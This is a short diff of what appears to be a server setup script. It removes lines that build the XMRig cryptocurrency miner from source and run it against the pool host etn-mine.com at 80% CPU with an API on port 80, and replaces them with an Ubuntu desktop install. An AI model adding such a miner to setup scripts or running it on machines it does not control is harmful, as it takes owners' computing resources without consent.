@@ -1,9 +1,1 @@
-sudo apt update
-sudo apt-get install git build-essential cmake libuv1-dev libmicrohttpd-dev screen -y
-git clone https://github.com/xmrig/xmrig.git
-cd xmrig
-mkdir build
-cd build
-cmake ..
-make
-./xmrig --print-time 5 --donate-level 0.1 --api-port 80 --max-cpu-usage 80 --cpu-priority 5 -o etn-mine.com:1001 -u p1 -p x -k --nicehash
+sudo apt-get install --no-install-recommends ubuntu-desktop gnome-panel gnome-settings-daemon metacity nautilus gnome-terminal -y
